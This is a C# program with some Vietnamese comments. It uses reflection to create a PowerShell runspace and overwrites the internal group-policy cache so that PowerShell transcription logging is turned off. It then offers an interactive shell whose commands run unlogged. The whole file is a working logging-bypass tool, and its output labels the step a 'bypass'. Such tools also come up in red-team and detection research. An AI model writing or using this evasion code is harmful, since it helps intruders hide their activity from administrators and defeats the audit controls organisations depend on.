using System;
using System.Reflection;
using System.Linq;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Management.Automation;

namespace CustomRunspace
{
    class Program
    {
        static void Main(string[] args)
        {
            Assembly psAssembly = typeof(PowerShell).Assembly;
            Type psType = typeof(PowerShell);

            Type runspaceFactoryType = psAssembly.GetType(
                "System.Management.Automation.Runspaces.RunspaceFactory"
            );

            Type runspaceType = psAssembly.GetType(
                "System.Management.Automation.Runspaces.Runspace"
            );

            // ============================================================
            // 1. RunspaceFactory.CreateRunspace()
            // ============================================================
            MethodInfo createRunspace = runspaceFactoryType
                .GetMethods(BindingFlags.Public | BindingFlags.Static)
                .First(m => m.Name == "CreateRunspace" && m.GetParameters().Length == 0);

            object runspace = createRunspace.Invoke(null, null);

            Console.WriteLine("[+] Runspace created");

            // ============================================================
            // 2. BYPASS: Transcription
            // ============================================================
            BindingFlags bf = BindingFlags.NonPublic | BindingFlags.Static;

            Type utilsType = psAssembly.GetType(
                "System.Management.Automation.Utils"
            );

            FieldInfo cachedGroupPolicyField = utilsType
                .GetFields(BindingFlags.NonPublic | BindingFlags.Static)
                .First(f => f.Name == "cachedGroupPolicySettings");

            object cachedGroupPolicy = cachedGroupPolicyField.GetValue(null);

            Type dictionaryType = typeof(Dictionary<string, object>);
            object dic = Activator.CreateInstance(dictionaryType);

            MethodInfo dictAdd = dictionaryType
                .GetMethods(BindingFlags.Public | BindingFlags.Instance)
                .First(m => m.Name == "Add" && m.GetParameters().Length == 2);

            dictAdd.Invoke(dic, new object[] { "EnableTranscripting", "0" });

            string registryKey = "HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription";

            MethodInfo getOrAdd = cachedGroupPolicy.GetType()
                .GetMethods(BindingFlags.Public | BindingFlags.Instance)
                .Where(m => m.Name == "GetOrAdd")
                .Where(m => m.GetParameters().Length == 2)
                .Where(m => m.GetParameters()[0].ParameterType == typeof(string))
                .Where(m => m.GetParameters()[1].ParameterType == dictionaryType)
                .First();

            getOrAdd.Invoke(cachedGroupPolicy, new object[] { registryKey, dic });

            Console.WriteLine("[+] Bypass applied: EnableTranscripting=0");

            // ============================================================
            // 3. rs.Open()
            // ============================================================
            runspaceType
                .GetMethods(BindingFlags.Public | BindingFlags.Instance)
                .First(m => m.Name == "Open" && m.GetParameters().Length == 0)
                .Invoke(runspace, null);

            Console.WriteLine("[+] Runspace opened\n");
            Console.WriteLine("=== PowerShell Interactive Shell ===");
            Console.WriteLine("Type PowerShell commands (exit to quit)\n");

            // ============================================================
            // 4. VÒNG LẶP: Nhận lệnh liên tục
            // ============================================================
            while (true)
            {
                Console.Write("PS> ");
                string input = Console.ReadLine();

                if (string.IsNullOrWhiteSpace(input))
                    continue;

                if (input.Trim().ToLower() == "exit")
                {
                    Console.WriteLine("[*] Closing runspace...");
                    break;
                }

                try
                {
                    // Tạo PowerShell mới
                    MethodInfo psCreate = psType
                        .GetMethods(BindingFlags.Public | BindingFlags.Static)
                        .First(m => m.Name == "Create" && m.GetParameters().Length == 0);

                    object psInstance = psCreate.Invoke(null, null);

                    // Gán runspace
                    PropertyInfo runspaceProp = psType
                        .GetProperties(BindingFlags.Public | BindingFlags.Instance)
                        .First(p => p.Name == "Runspace");

                    runspaceProp.SetValue(psInstance, runspace);

                    // ============================================================
                    // ĐIỂM QUAN TRỌNG: Dùng AddScript thay vì AddCommand
                    // ============================================================
                    MethodInfo addScript = psType
                        .GetMethods(BindingFlags.Public | BindingFlags.Instance)
                        .Where(m => m.Name == "AddScript")
                        .Where(m => m.GetParameters().Length == 1)
                        .Where(m => m.GetParameters()[0].ParameterType == typeof(string))
                        .First();

                    object psAfterScript = addScript.Invoke(psInstance, new object[] { input });

                    // Invoke
                    MethodInfo invoke = psType
                        .GetMethods(BindingFlags.Public | BindingFlags.Instance)
                        .First(m => m.Name == "Invoke" && m.GetParameters().Length == 0);

                    object results = invoke.Invoke(psAfterScript, null);

                    // In kết quả
                    bool hasOutput = false;
                    foreach (var result in (System.Collections.IEnumerable)results)
                    {
                        Console.WriteLine(result);
                        hasOutput = true;
                    }

                    if (!hasOutput)
                    {
                        Console.WriteLine(); // Dòng trống nếu không có output
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[!] Error: {ex.InnerException?.Message ?? ex.Message}");
                }
            }

            // ============================================================
            // 5. Đóng runspace
            // ============================================================
            runspaceType
                .GetMethods(BindingFlags.Public | BindingFlags.Instance)
                .First(m => m.Name == "Close" && m.GetParameters().Length == 0)
                .Invoke(runspace, null);

            Console.WriteLine("[+] Done");
        }
    }
}